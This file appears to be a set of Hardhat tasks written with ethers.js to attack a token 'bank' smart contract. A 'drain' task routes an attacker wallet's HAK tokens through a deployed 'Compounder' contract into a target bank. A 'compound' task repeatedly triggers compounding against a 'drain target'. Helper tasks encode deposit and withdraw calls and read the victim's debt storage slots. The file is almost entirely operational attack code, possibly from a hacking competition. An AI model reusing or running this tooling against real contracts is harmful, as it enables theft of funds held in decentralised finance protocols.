const ethers = require('ethers')

const HAK_TOKEN = '0xbefeed4cb8c6dd190793b1c97b72b60272f3ea6c'
const OUR_BANK = '0x046d90f1614c3732ce04d866bc9ef0ae1cdda509'

async function doTx(txPromise, description, waitForCompletion = true) {
  const tx = await txPromise
  console.log(`${description} tx(#${tx.nonce}): ${tx.hash}`)
  if (waitForCompletion) {
    await tx.wait()
    console.log(`${description} complete`)
  }
}

const sleep = (timeout) => new Promise((resolve) => setTimeout(() => resolve(), timeout))

const MINUTES = 60 * 1000

const gasPrices = (gasLimit) => ({
  gasLimit,
  maxFeePerGas: ethers.utils.parseUnits('1.5', 'gwei'),
  maxPriorityFeePerGas: ethers.utils.parseUnits('1.5', 'gwei')
})

async function compoundRegularly({ target }, { ethers }) {
  const compounder = await ethers.getContractAt(
    'Compounder',
    '0xe0fbd4ebe081c32473fcd38d53bc84f88e4c5098'
  )
  for (let i = 0; i < 32; i++) {
    console.log(`doing compound #${i + 1}`)
    await doTx(compounder.doCompound(target, gasPrices(400_000)), 'compound', false)
    await sleep(5 * MINUTES)
  }
  console.log('done')
}

async function drain({ bank }, hre) {
  const ethers = hre.ethers
  const compounder = await ethers.getContractAt(
    'Compounder',
    '0xe0fbd4ebe081c32473fcd38d53bc84f88e4c5098'
  )
  const hakToken = await ethers.getContractAt('ERC20', HAK_TOKEN)
  const [attackWallet] = await ethers.getSigners()
  const workingBalance = await hakToken.balanceOf(attackWallet.address)
  await doTx(hakToken.transfer(compounder.address, workingBalance, gasPrices(150_000)), 'transfer')
  await doTx(compounder.approveBank(bank, gasPrices(150_000)), 'approve')
  await doTx(
    compounder.depositToBank(bank, hakToken.address, workingBalance, gasPrices(400_000)),
    'deposit'
  )
}

async function encodeDeposit({ amount }, hre) {
  const ethers = hre.ethers

  const IBank = new ethers.utils.Interface([
    'function deposit(address token, uint256 amount) payable external returns (bool)'
  ])
  const encDeposit = IBank.encodeFunctionData('deposit', [HAK_TOKEN, amount])
  console.log('encDeposit: ', encDeposit)
}

async function encodeWithdraw({ amount }, hre) {
  const ethers = hre.ethers

  const IBank = new ethers.utils.Interface([
    'function withdraw(address token, uint256 amount) external returns (uint256)'
  ])
  const encWithdraw = IBank.encodeFunctionData('withdraw', [HAK_TOKEN, amount])
  console.log('encWithdraw: ', encWithdraw)
}

async function getDebt({ account }, { ethers }) {
  const abi = ethers.utils.defaultAbiCoder
  const packed = abi.encode(['address', 'uint256'], [account, '4'])
  const hash = ethers.utils.keccak256(packed)
  const slot1 = ethers.BigNumber.from(hash)
  const slot2 = slot1.add('1')
  const slot3 = slot2.add('1')
  const [balance, interest, lastInterestBlock] = await Promise.all(
    [slot1, slot2, slot3].map(async (numSlot) => {
      const rawData = await ethers.provider.getStorageAt(OUR_BANK, numSlot.toHexString())
      return ethers.BigNumber.from(rawData)
    })
  )
  console.log('balance: ', balance)
  console.log('interest: ', interest)
  console.log('lastInterestBlock: ', lastInterestBlock)
}

task('drain', 'Deploys tokens to a bank').addParam('bank', 'bank address to drain').setAction(drain)
task('enc-deposit', 'Encodes for deposit')
  .addParam('amount', 'amount to encode')
  .setAction(encodeDeposit)
task('enc-withdraw', 'Encodes for deposit')
  .addParam('amount', 'amount to encode')
  .setAction(encodeWithdraw)
task('compound', 'Encodes for deposit')
  .addParam('target', 'drain target')
  .setAction(compoundRegularly)
task('get-debt', 'gets debt').addParam('account', 'account').setAction(getDebt)
